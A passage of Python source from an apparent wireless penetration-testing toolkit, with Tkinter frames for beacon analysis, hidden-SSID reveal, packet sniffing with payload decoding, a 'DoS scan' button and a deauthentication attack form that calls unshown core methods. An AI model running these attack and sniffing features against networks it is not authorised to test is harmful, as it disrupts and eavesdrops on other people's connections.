            print(f"Configuration updated: {key} = {value}")
        except Exception as e:
            print(f"Error updating configuration: {e}")

    def do_report(self, arg):
        """
        Generate a scan or exploit report.
        Usage: report <format>
        """
        args = arg.split()
        if len(args) != 1 or args[0] not in ["txt", "json"]:
            print("Usage: report <format>\nSupported formats: txt, json")
            return
        format = args[0]
        try:
            self.core.generate_report(format)
            print(f"Report generated in {format} format.")
        except Exception as e:
            print(f"Error generating report: {e}")

    def do_exit(self, arg):
        """
        Exit the console.
        Usage: exit
        """
        print("Exiting WirelessPenTest Console. Goodbye!")
        return True

    def default(self, line):
        print(f"Unknown command: {line}")

    def emptyline(self):
        pass  # Ignore empty lines

if __name__ == "__main__":
    WirelessPenTestConsole().cmdloop()


# ui/test_gui.py
import unittest
from .gui import WirelessPenTestGUI
from ui.frames.live_network_frame import LiveNetworkFrame


def create_fake_test_data():
    return {
        "wpa_networks": {
            "00:11:22:33:44:55": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:55",
                "Security": "WPA2",
                "WPS_Enabled": False
            }
        },
        "wep_networks": {
            "00:11:22:33:44:66": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:66",
                "Security": "WEP",
                "Key_Strength": "Weak"
            }
        }
    }

class TestGui(unittest.TestCase):
    def test_gui(self):
        # Create a fake test data
        test_data = create_fake_test_data()

        # Create a GUI instance
        gui = WirelessPenTestGUI()

        # Create a LiveNetworkFrame instance
        live_network_frame = LiveNetworkFrame(gui, core_framework=None)

        # Update the GUI with the test data
        live_network_frame.update_gui(test_data)

        # Check if the GUI has been updated correctly
        self.assertEqual(gui.wpa_networks, test_data["wpa_networks"])
        self.assertEqual(gui.wep_networks, test_data["wep_networks"])

if __name__ == '__main__':
    unittest.main()

# ui/__init__.py
from .gui import WirelessPenTestGUI
from ui.frames.live_network_frame import LiveNetworkFrame


# ui/frames/anomaly_detector_frame.py
# ui/frames/anomaly_detection_frame.py

import tkinter as tk
from tkinter import ttk, messagebox
from core import CoreFramework
import pandas as pd

class AnomalyDetectionFrame(ttk.Frame):
    def __init__(self, parent, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self):
        # Load Traffic Data Button
        load_button = ttk.Button(self, text="Load Traffic Data", command=self.load_data)
        load_button.pack(pady=10)

        # Anomaly Detection Button
        detect_button = ttk.Button(self, text="Detect Anomalies", command=self.detect_anomalies)
        detect_button.pack(pady=10)

        # Anomalies Display Area
        self.anomaly_tree = ttk.Treeview(self, columns=("Timestamp", "Source", "Destination", "Packet Type", "Anomaly"), show='headings')
        self.anomaly_tree.heading("Timestamp", text="Timestamp")
        self.anomaly_tree.heading("Source", text="Source")
        self.anomaly_tree.heading("Destination", text="Destination")
        self.anomaly_tree.heading("Packet Type", text="Packet Type")
        self.anomaly_tree.heading("Anomaly", text="Anomaly")
        self.anomaly_tree.pack(fill=tk.BOTH, expand=True)

    def load_data(self):
        # Implement functionality to load traffic data (e.g., from PCAP)
        messagebox.showinfo("Load Data", "Load traffic data functionality is not implemented yet.")

    def detect_anomalies(self):
        # Example traffic data
        traffic_data = [
            {'Timestamp': '2024-11-18 10:00:00', 'Source': '192.168.1.2', 'Destination': '192.168.1.1', 'Packet Type': 'HTTP'},
            {'Timestamp': '2024-11-18 10:00:05', 'Source': '192.168.1.3', 'Destination': '192.168.1.1', 'Packet Type': 'FTP'},
            # Add more data points...
        ]

        anomalies = self.core.perform_anomaly_detection(traffic_data)
        for _, row in anomalies.iterrows():
            self.anomaly_tree.insert("", tk.END, values=(row['Timestamp'], row['Source'], row['Destination'], row['Packet Type'], "Yes"))


# ui/frames/base_frame.py
from abc import ABC, abstractmethod
from tkinter import Tk, Frame, Label, Button, Entry, StringVar, messagebox
from tkinter import ttk
from typing import Dict, Any
from core import CoreFramework


class BaseFrame(ttk.Frame, ABC):
    def __init__(self, parent: Tk, core_framework: CoreFramework, *args, **kwargs):
        """
        Initializes the BaseFrame.
        Args:
            parent (Tk): The parent Tkinter widget.
            core_framework (CoreFramework): An instance of CoreFramework.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent
        self.core_framework = core_framework

    @abstractmethod
    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        pass

    @abstractmethod
    def update_gui(self, data: Dict[str, Any]):
        """
        Updates the GUI with the given data.
        Args:
            data (Dict[str, Any]): The data to update the GUI with.
        """
        pass

    @abstractmethod
    def clear_gui(self):
        """
        Clears the GUI components.
        """
        pass

# ui/frames/beacon_analysis_frame.py
# ui/frames/beacon_analysis_frame.py

import tkinter as tk
from tkinter import ttk
from core import CoreFramework

class BeaconAnalysisFrame(ttk.Frame):
    def __init__(self, parent, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self):
        self.start_button = ttk.Button(self, text="Start Beacon Analysis", command=self.start_analysis)
        self.start_button.pack(pady=10)

        self.stop_button = ttk.Button(self, text="Stop Analysis", command=self.stop_analysis)
        self.stop_button.pack(pady=10)

        self.ap_tree = ttk.Treeview(self, columns=("SSID", "BSSID", "Capabilities", "Last Seen"), show='headings')
        self.ap_tree.heading("SSID", text="SSID")
        self.ap_tree.heading("BSSID", text="BSSID")
        self.ap_tree.heading("Capabilities", text="Capabilities")
        self.ap_tree.heading("Last Seen", text="Last Seen")
        self.ap_tree.pack(fill=tk.BOTH, expand=True)

        self.refresh_button = ttk.Button(self, text="Refresh", command=self.refresh_data)
        self.refresh_button.pack(pady=10)

    def start_analysis(self):
        self.core.start_beacon_analysis()

    def stop_analysis(self):
        self.core.stop_event.set()

    def refresh_data(self):
        ap_list = self.core.get_access_points()
        for row in self.ap_tree.get_children():
            self.ap_tree.delete(row)
        for ap in ap_list:
            self.ap_tree.insert("", tk.END, values=(ap['SSID'], ap['BSSID'], ", ".join(ap['Capabilities']), ap['Last Seen']))


# ui/frames/deauth_attack_frame.py
# ui/frames/deauth_attack_frame.py

import tkinter as tk
from tkinter import ttk, messagebox
from core import CoreFramework

class DeauthAttackFrame(ttk.Frame):
    def __init__(self, parent, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self):
        # Target BSSID
        bssid_label = ttk.Label(self, text="Target BSSID:")
        bssid_label.pack(pady=5)
        self.bssid_entry = ttk.Entry(self, width=30)
        self.bssid_entry.pack(pady=5)

        # Target Client (Optional)
        client_label = ttk.Label(self, text="Target Client MAC (Optional):")
        client_label.pack(pady=5)
        self.client_entry = ttk.Entry(self, width=30)
        self.client_entry.pack(pady=5)

        # Interface Selection
        interface_label = ttk.Label(self, text="Network Interface:")
        interface_label.pack(pady=5)
        self.interface_entry = ttk.Entry(self, width=30)
        self.interface_entry.pack(pady=5)

        # Start and Stop Buttons
        self.start_button = ttk.Button(self, text="Start Deauth Attack", command=self.start_attack)
        self.start_button.pack(pady=10)

        self.stop_button = ttk.Button(self, text="Stop Deauth Attack", command=self.stop_attack)
        self.stop_button.pack(pady=10)

    def start_attack(self):
        bssid = self.bssid_entry.get().strip()
        client = self.client_entry.get().strip()
        interface = self.interface_entry.get().strip()

        if not bssid or not interface:
            messagebox.showwarning("Input Required", "Please provide at least the Target BSSID and Interface.")
            return

        # Validate MAC address format
        if not self.is_valid_mac(bssid):
            messagebox.showerror("Invalid BSSID", "Please enter a valid BSSID (MAC address).")
            return
        if client and not self.is_valid_mac(client):
            messagebox.showerror("Invalid Client MAC", "Please enter a valid Client MAC address.")
            return

        self.core.execute_deauth_attack(interface, bssid, client)
        messagebox.showinfo("Attack Started", "Deauthentication attack has been started.")

    def stop_attack(self):
        self.core.stop_all_deauth_attacks()
        messagebox.showinfo("Attack Stopped", "All deauthentication attacks have been stopped.")

    @staticmethod
    def is_valid_mac(mac: str) -> bool:
        import re
        pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(pattern.match(mac))


# ui/frames/hidden_ssid_frame.py
# ui/frames/hidden_ssid_frame.py

import tkinter as tk
from tkinter import ttk
from core import CoreFramework

class HiddenSSIDFrame(ttk.Frame):
    def __init__(self, parent, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self):
        self.start_button = ttk.Button(self, text="Start Hidden SSID Reveal", command=self.start_reveal)
        self.start_button.pack(pady=10)

        self.stop_button = ttk.Button(self, text="Stop Reveal", command=self.stop_reveal)
        self.stop_button.pack(pady=10)

        self.ssid_tree = ttk.Treeview(self, columns=("SSID", "MAC Address", "Last Seen"), show='headings')
        self.ssid_tree.heading("SSID", text="SSID")
        self.ssid_tree.heading("MAC Address", text="MAC Address")
        self.ssid_tree.heading("Last Seen", text="Last Seen")
        self.ssid_tree.pack(fill=tk.BOTH, expand=True)

        self.refresh_button = ttk.Button(self, text="Refresh", command=self.refresh_data)
        self.refresh_button.pack(pady=10)

    def start_reveal(self):
        self.core.start_hidden_ssid_reveal()

    def stop_reveal(self):
        self.core.stop_event.set()

    def refresh_data(self):
        ssid_list = self.core.get_hidden_ssids()
        for row in self.ssid_tree.get_children():
            self.ssid_tree.delete(row)
        for ssid in ssid_list:
            self.ssid_tree.insert("", tk.END, values=(ssid['SSID'], ssid['MAC Address'], ssid['Last Seen']))


# ui/frames/live_network_frame.py
import threading
import queue
from typing import List, Dict, Any
import tkinter as tk
from tkinter import ttk, messagebox
from scanners.local_scanner import LocalScanner  # Ensure this import is correct
from scanners.dos_scanner import DosScanner  # Ensure this import is correct


def create_fake_test_data():
    return {
        "devices": [
            {
                "ip": "123.22.22.22",
                "mac": "00:11:22:33:44:55",
                "hostname": "TestDevice",
                "ssid": "TestNetwork",
                "bssid": "00:11:22:33:44:55"
            }
        ]
    }


class LiveNetworkFrame(ttk.Frame):
    def __init__(self, parent: tk.Tk, core_framework, scan_interval: int = 5, *args, **kwargs):
        """
        Initializes the LiveNetworkFrame.
        Args:
            parent (tk.Tk): The parent Tkinter widget.
            core_framework (CoreFramework): An instance of CoreFramework.
            scan_interval (int): Interval between scans in seconds.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent
        self.pack(fill='both', expand=True)
        self.core_framework = core_framework


        # Initialize Scanners with CoreFramework
        self.scanner = LocalScanner(core_framework=self.core_framework,
                                    interface="eth0")  # Make the interface configurable
        self.dos_scanner = DosScanner(core_framework=self.core_framework, vulnerability_db={})

        self.scan_interval = scan_interval  # Scan interval in seconds

        # Initialize Queue for Scan Results
        self.device_queue = queue.Queue()

        # Setup Logger
        self.logger = self.scanner.logger  # Assuming LocalScanner has a logger

        # Setup GUI Components
        self.create_widgets()

        # Start processing the scan queue
        self.process_scan_queue()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Frame for Scan Controls
        control_frame = ttk.LabelFrame(self, text="Network Scan Controls")
        control_frame.pack(padx=10, pady=10, fill='x')

        # Manual Scan Button
        scan_button = ttk.Button(control_frame, text="Perform Manual Scan", command=self.perform_manual_scan)
        scan_button.pack(side='left', padx=5, pady=5)

        # DoS Scan Button
        dos_button = ttk.Button(control_frame, text="Start DoS Scan", command=self.initiate_dos_scan)
        dos_button.pack(side='left', padx=5, pady=5)

        # Treeview for Displaying Devices
        columns = ("IP Address", "MAC Address", "Hostname", "SSID", "BSSID")
        self.tree = ttk.Treeview(self, columns=columns, show='headings')
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=150)
        self.tree.pack(padx=10, pady=10, fill='both', expand=True)

        # Scrollbar for Treeview
        scrollbar = ttk.Scrollbar(self, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)
        scrollbar.pack(side='right', fill='y')

        # Feedback Label
        self.feedback_label = ttk.Label(self, text="Welcome to Network Scanner GUI", foreground="blue")
        self.feedback_label.pack(pady=5)

    def perform_manual_scan(self):
        """
        Initiates a manual network scan and updates the Treeview with the scan results.
        """
        self.logger.info("Manual network scan initiated.")
        self.update_feedback("Manual network scan started.")

        def scan():
            try:
                scan_results = self.scanner.scan()  # Implement the actual scan method
                self.device_queue.put(scan_results)
                self.logger.info("Manual network scan completed.")
                self.update_feedback("Manual network scan completed.")
            except Exception as e:
                self.logger.error(f"Error during manual network scan: {e}")
                self.update_feedback(f"Error during manual network scan: {e}")

        threading.Thread(target=scan, daemon=True).start()

    def process_scan_queue(self):
        """
        Processes scan results from the device_queue and updates the Treeview.
        Schedules itself to run every second.
        """
        try:
            while not self.device_queue.empty():
                scan_results = self.device_queue.get_nowait()
                devices = scan_results.get("devices", [])
                self.update_treeview(devices)
        except queue.Empty:
            pass
        except Exception as e:
            self.logger.error(f"Error processing scan queue: {e}")
            self.update_feedback(f"Error processing scan queue: {e}")
        finally:
            self.after(1000, self.process_scan_queue)  # Check the queue every second

    def update_treeview(self, devices: List[Dict[str, Any]]):
        """
        Updates the Treeview with new scan results.
        Args:
            devices (List[Dict[str, Any]]): List of detected devices.
        """
        # Clear existing entries
        for item in self.tree.get_children():
            self.tree.delete(item)

        # Insert new entries
        for device in devices:
            ip = device.get("ip", "N/A")
            mac = device.get("mac", "N/A")
            hostname = device.get("hostname", "N/A")
            ssid = device.get("ssid", "N/A")
            bssid = device.get("bssid", "N/A")
            self.tree.insert("", "end", values=(ip, mac, hostname, ssid, bssid))

    def initiate_dos_scan(self):
        """
        Initiates a DoS scan on the selected target(s) in the Treeview.
        """
        selected_items = self.tree.selection()
        if not selected_items:
            self.update_feedback("No target selected for DoS scan.")
            return

        for item_id in selected_items:
            target = self.tree.item(item_id)['values']
            if not target:
                self.update_feedback("Invalid target selected.")
                continue

            # Assuming Treeview columns are ordered as: IP, MAC, Hostname, SSID, BSSID
            bssid = target[4]  # BSSID is at index 4
            target_info = {'bssid': bssid}
            self.update_feedback(f"Initiating DoS scan on target with BSSID: {bssid}")

            def dos_scan():
                try:
                    self.dos_scanner.scan(target_info)  # Implement the actual DoS scan method
                    self.update_feedback(f"DoS scan on BSSID {bssid} completed.")
                except Exception as e:
                    self.logger.error(f"Error during DoS scan on BSSID {bssid}: {e}")
                    self.update_feedback(f"Error during DoS scan on BSSID {bssid}: {e}")

            threading.Thread(target=dos_scan, daemon=True).start()

    def update_feedback(self, message: str):
        """
        Updates the feedback label with the provided message.
        Args:
            message (str): The message to display to the user.
        """
        self.feedback_label.config(text=message)

    def update_feedback_with_test_data(self):
        """
        Updates the feedback label with test data.
        """
        self.feedback_label.config(text="Test data updated successfully.")
        self.update_feedback("Test data updated successfully.")
        self.update_feedback(f"devices: {create_fake_test_data()}")

# ui/frames/live_packet_monitor.py
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL, N, S, E, W

from scapy.all import sniff, wrpcap, rdpcap, Packet
from scapy.layers.l2 import Ether
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp
import threading
import time
import queue
import os


# Assuming BaseFrame is a subclass of ttk.Frame
class BaseFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)


class LivePacketMonitor(BaseFrame):
    """
    Wireshark-like live packet monitoring frame
    """
    def __init__(self, parent):
        """
        Initializes the LivePacketMonitor.
        """
        super().__init__(parent)
        self.parent = parent
        self.pack(fill=tk.BOTH, expand=True)

        # Initialize variables
        self.packet_list = []
        self.sniffing = False
        self.sniffer_thread = None
        self.packet_queue = queue.Queue()

        # Create GUI components
        self.create_widgets()

        # Start a periodic GUI update
        self.parent.after(100, self.process_packet_queue)

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Top Frame for buttons
        button_frame = ttk.Frame(self)
        button_frame.pack(fill=tk.X, padx=5, pady=5)

        # Start Button
        self.start_button = ttk.Button(button_frame, text="Start", command=self.start_sniffing)
        self.start_button.pack(side=tk.LEFT, padx=5)

        # Stop Button
        self.stop_button = ttk.Button(button_frame, text="Stop", command=self.stop_sniffing, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        # Save Button
        self.save_button = ttk.Button(button_frame, text="Save", command=self.save_packets)
        self.save_button.pack(side=tk.LEFT, padx=5)

        # Load Button
        self.load_button = ttk.Button(button_frame, text="Load", command=self.load_packets)
        self.load_button.pack(side=tk.LEFT, padx=5)

        # Clear Button
        self.clear_button = ttk.Button(button_frame, text="Clear", command=self.clear_packets)
        self.clear_button.pack(side=tk.LEFT, padx=5)

        # Filter Entry and Button
        self.filter_var = StringVar()
        self.filter_entry = ttk.Entry(button_frame, textvariable=self.filter_var)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.insert(0, "Filter (e.g., tcp, udp)")

        self.filter_button = ttk.Button(button_frame, text="Apply Filter", command=self.filter_packets)
        self.filter_button.pack(side=tk.LEFT, padx=5)

        # Treeview for packet list
        columns = ("No.", "Time", "Source", "Destination", "Protocol")
        self.tree = ttk.Treeview(self, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, anchor=tk.W, stretch=True)

        # Vertical Scrollbar
        vsb = ttk.Scrollbar(self, orient=VERTICAL, command=self.tree.yview)
        self.tree.configure(yscroll=vsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        # Horizontal Scrollbar
        hsb = ttk.Scrollbar(self, orient=HORIZONTAL, command=self.tree.xview)
        self.tree.configure(xscroll=hsb.set)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)

        self.tree.pack(fill=tk.BOTH, expand=True)

        # Bind selection
        self.tree.bind("<<TreeviewSelect>>", self.view_packet)

        # Text widget for packet details
        detail_frame = ttk.Frame(self)
        detail_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        detail_label = ttk.Label(detail_frame, text="Packet Details:")
        detail_label.pack(anchor=tk.W)

        self.detail_text = Text(detail_frame, height=15, wrap=tk.NONE)
        self.detail_text.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbars for detail_text
        detail_vsb = Scrollbar(detail_frame, orient=VERTICAL, command=self.detail_text.yview)
        self.detail_text.configure(yscrollcommand=detail_vsb.set)
        detail_vsb.pack(side=tk.RIGHT, fill=tk.Y)

    def update_gui(self, packet_info):
        """
        Updates the GUI with the given data.
        Args:
            packet_info (Dict[str, Any]): The data to update the GUI with.
        """
        self.packet_list.append(packet_info)
        index = len(self.packet_list)
        self.tree.insert("", "end", iid=index, values=(
            index,
            packet_info['time'],
            packet_info['source'],
            packet_info['destination'],
            packet_info['protocol']
        ))

    def clear_gui(self):
        """
        Clears the GUI components.
        """
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.detail_text.delete(1.0, END)
        self.packet_list.clear()

    def start_sniffing(self):
        """
        Starts sniffing packets.
        """
        if not self.sniffing:
            self.sniffing = True
            self.sniffer_thread = threading.Thread(target=self.sniff_packets, daemon=True)
            self.sniffer_thread.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            messagebox.showinfo("Sniffing Started", "Packet sniffing has started.")
        else:
            messagebox.showwarning("Warning", "Sniffing is already running.")

    def stop_sniffing(self):
        """
        Stops sniffing packets.
        """
        if self.sniffing:
            self.sniffing = False
            self.sniffer_thread.join()
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            messagebox.showinfo("Sniffing Stopped", "Packet sniffing has stopped.")
        else:
            messagebox.showwarning("Warning", "Sniffing is not running.")

    def sniff_packets(self):
        """
        Sniffs packets using Scapy and puts them into a queue for the GUI to process.
        """
        try:
            sniff(prn=self.packet_handler, store=False, stop_filter=lambda x: not self.sniffing)
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred while sniffing packets:\n{e}")
            self.sniffing = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def packet_handler(self, pkt):
        """
        Handles packets captured by the sniffer.
        Args:
            pkt: The packet captured by the sniffer.
        """
        # Extract relevant information
        pkt_time = time.strftime("%H:%M:%S", time.localtime(pkt.time))
        src = "N/A"
        dst = "N/A"
        protocol = pkt.summary()

        if Ether in pkt:
            src = pkt[Ether].src
            dst = pkt[Ether].dst

        # Attempt to extract and decode payload
        payload = b""
        decoded_payload = "No Decodable Payload"

        # Check for Raw layer which contains the payload
        if pkt.haslayer("Raw"):
            payload = pkt.getlayer("Raw").load
            try:
                decoded_payload = payload.decode('utf-8', errors='replace')
            except Exception as e:
                decoded_payload = "Payload could not be decoded."

        # You can extend this to extract more details as needed

        packet_info = {
            'time': pkt_time,
            'source': src,
            'destination': dst,
            'protocol': protocol,
            'packet': pkt,  # Store the entire packet for detailed view
            'payload': payload,  # Raw payload
            'decoded_payload': decoded_payload  # Decoded payload
        }

        # Put the packet_info into the queue
        self.packet_queue.put(packet_info)

    def process_packet_queue(self):
        """
        Processes the packet queue and updates the GUI accordingly.
        """
        try:
            while True:
                packet_info = self.packet_queue.get_nowait()
                self.update_gui(packet_info)
        except queue.Empty:
            pass
        finally:
            # Schedule the next check
            self.parent.after(100, self.process_packet_queue)

    def save_packets(self):
        """
        Saves the captured packets to a file.
        """
        if not self.packet_list:
            messagebox.showwarning("No Packets", "There are no packets to save.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".pcap",
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )

        if file_path:
            try:
                packets = [pkt_info['packet'] for pkt_info in self.packet_list]
                wrpcap(file_path, packets)
                messagebox.showinfo("Success", f"Packets saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save packets:\n{e}")

    def load_packets(self):
        """
        Loads packets from a file.
        """
        file_path = filedialog.askopenfilename(
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )

        if file_path:
            try:
                loaded_packets = rdpcap(file_path)
                self.clear_packets()
                for pkt in loaded_packets:
                    pkt_time = time.strftime("%H:%M:%S", time.localtime(pkt.time))
                    src = "N/A"
                    dst = "N/A"
                    protocol = pkt.summary()

                    if Ether in pkt:
                        src = pkt[Ether].src
                        dst = pkt[Ether].dst

                    # Attempt to extract and decode payload
                    payload = b""
                    decoded_payload = "No Decodable Payload"

                    if pkt.haslayer("Raw"):
                        payload = pkt.getlayer("Raw").load
                        try:
                            decoded_payload = payload.decode('utf-8', errors='replace')
                        except Exception as e:
                            decoded_payload = "Payload could not be decoded."

                    packet_info = {
                        'time': pkt_time,
                        'source': src,
                        'destination': dst,
                        'protocol': protocol,
                        'packet': pkt,
                        'payload': payload,
                        'decoded_payload': decoded_payload
                    }

                    self.update_gui(packet_info)
                messagebox.showinfo("Success", f"Loaded {len(loaded_packets)} packets from {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load packets:\n{e}")

    def clear_packets(self):
        """
        Clears the captured packets.
        """
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all captured packets?"):
            self.clear_gui()

    def filter_packets(self):
        """
        Filters the captured packets based on user input.
        """
        filter_text = self.filter_var.get().strip().lower()
        if not filter_text:
            # If no filter, show all packets
            for item in self.tree.get_children():
                self.tree.delete(item)
            for index, pkt_info in enumerate(self.packet_list, start=1):
                self.tree.insert("", "end", iid=index, values=(
                    index,
                    pkt_info['time'],
                    pkt_info['source'],
                    pkt_info['destination'],
                    pkt_info['protocol']
                ))
            return

        # Filter packets
        filtered_packets = []
        for pkt_info in self.packet_list:
            if filter_text in pkt_info['protocol'].lower():
                filtered_packets.append(pkt_info)

        # Update Treeview
        self.tree.delete(*self.tree.get_children())
        for index, pkt_info in enumerate(filtered_packets, start=1):
            self.tree.insert("", "end", iid=index, values=(
                index,
                pkt_info['time'],
                pkt_info['source'],
                pkt_info['destination'],
                pkt_info['protocol']
            ))

    def view_packet(self, event):
        """
        Views the details of a selected packet.
        """
        selected_items = self.tree.selection()
        if not selected_items:
            return

        selected_item = selected_items[0]
        index = int(selected_item) - 1
        if index < 0 or index >= len(self.packet_list):
            messagebox.showerror("Error", "Invalid packet selection.")
            return

        pkt_info = self.packet_list[index]
        pkt = pkt_info['packet']

        # Create a new window to display packet details
        detail_window = tk.Toplevel(self)
        detail_window.title(f"Packet #{index + 1} Details")
        detail_window.geometry("800x700")  # Increased height for payload

        # Create Notebook for organized tabs
        notebook = ttk.Notebook(detail_window)
        notebook.pack(fill=tk.BOTH, expand=True)

        # Frame for Packet Summary
        summary_frame = ttk.Frame(notebook)
        notebook.add(summary_frame, text="Summary")

        # Text widget for Packet Summary
        summary_text = Text(summary_frame, height=15, wrap=tk.NONE)
        summary_text.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbars for summary_text
        summary_vsb = Scrollbar(summary_frame, orient=VERTICAL, command=summary_text.yview)
        summary_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        summary_text.configure(yscrollcommand=summary_vsb.set)

        summary_hsb = Scrollbar(summary_frame, orient=HORIZONTAL, command=summary_text.xview)
        summary_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        summary_text.configure(xscrollcommand=summary_hsb.set)

        # Insert packet summary
        packet_summary = pkt.show(dump=True)
        summary_text.insert(END, packet_summary)
        summary_text.config(state=tk.DISABLED)

        # Frame for Decoded Payload
        payload_frame = ttk.Frame(notebook)
        notebook.add(payload_frame, text="Decoded Payload")

        # Text widget for Decoded Payload
        payload_text = Text(payload_frame, height=15, wrap=tk.NONE)
        payload_text.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbars for payload_text
        payload_vsb = Scrollbar(payload_frame, orient=VERTICAL, command=payload_text.yview)
        payload_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        payload_text.configure(yscrollcommand=payload_vsb.set)

        payload_hsb = Scrollbar(payload_frame, orient=HORIZONTAL, command=payload_text.xview)
        payload_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        payload_text.configure(xscrollcommand=payload_hsb.set)

        # Insert decoded payload
        decoded_payload = pkt_info.get('decoded_payload', "No Decodable Payload")
        payload_text.insert(END, decoded_payload)
        payload_text.config(state=tk.DISABLED)

    def export_packet(self):
        """
        Exports the details of a selected packet.
        """
        selected_items = self.tree.selection()
        if not selected_items:
            messagebox.showwarning("No Selection", "Please select a packet to export.")
            return

        selected_item = selected_items[0]
        index = int(selected_item) - 1
        if index < 0 or index >= len(self.packet_list):
            messagebox.showerror("Error", "Invalid packet selection.")
            return

        pkt = self.packet_list[index]['packet']

        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(pkt.show(dump=True))
                messagebox.showinfo("Success", f"Packet details exported to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export packet:\n{e}")

    def import_packet(self):
        """
        Imports a packet from a file.
        """
        file_path = filedialog.askopenfilename(
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )

        if file_path:
            try:
                imported_packets = rdpcap(file_path)
                self.clear_packets()
                for pkt in imported_packets:
                    pkt_time = time.strftime("%H:%M:%S", time.localtime(pkt.time))
                    src = "N/A"
                    dst = "N/A"
                    protocol = pkt.summary()

                    if Ether in pkt:
                        src = pkt[Ether].src
                        dst = pkt[Ether].dst

                    # Attempt to extract and decode payload
                    payload = b""
                    decoded_payload = "No Decodable Payload"

                    if pkt.haslayer("Raw"):
                        payload = pkt.getlayer("Raw").load
                        try:
                            decoded_payload = payload.decode('utf-8', errors='replace')
                        except Exception as e:
                            decoded_payload = "Payload could not be decoded."

                    packet_info = {
                        'time': pkt_time,
                        'source': src,
                        'destination': dst,
                        'protocol': protocol,
                        'packet': pkt,
                        'payload': payload,
                        'decoded_payload': decoded_payload
                    }

                    self.update_gui(packet_info)
                messagebox.showinfo("Success", f"Imported {len(imported_packets)} packets from {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load packets:\n{e}")


# Example usage within a Tkinter application
def main():
    root = tk.Tk()
    root.title("Live Packet Monitor")
    root.geometry("1000x700")

    app = LivePacketMonitor(root)

    root.mainloop()


if __name__ == "__main__":
    main()
S

# ui/frames/network_graph_visualization.py
import tkinter as tk
from tkinter import filedialog, messagebox
import networkx as nx
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

class BaseFrame(tk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        self.configure(relief=tk.RAISED, borderwidth=2)
        self.init_ui()

    def init_ui(self):
        # Placeholder for any common UI setup across frames
        pass


class NetworkGraphVisualizationFrame(BaseFrame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)
        self.init_graph()
        self.init_ui()

    def init_graph(self):
        # Initialize an empty NetworkX graph
        self.G = nx.Graph()

    def init_ui(self):
        # Create and place the Matplotlib Figure
        self.figure = plt.Figure(figsize=(6, 4), dpi=100)
        self.ax = self.figure.add_subplot(111)
        self.ax.set_title("Network Graph Visualization")
        self.ax.axis('off')  # Hide axes

        self.canvas = FigureCanvasTkAgg(self.figure, master=self)
        self.canvas.draw()
        self.canvas.get_tk_widget().pack(side=tk.TOP, fill=tk.BOTH, expand=True)

        # Create and place control buttons
        button_frame = tk.Frame(self)
        button_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=5)

        self.load_button = tk.Button(button_frame, text="Load Graph", command=self.load_graph)
        self.load_button.pack(side=tk.LEFT, padx=5)

        self.plot_button = tk.Button(button_frame, text="Plot Graph", command=self.plot_graph)
        self.plot_button.pack(side=tk.LEFT, padx=5)

    def load_graph(self):
        # Open a file dialog to select a graph file (e.g., edge list)
        file_path = filedialog.askopenfilename(
            title="Open Graph File",
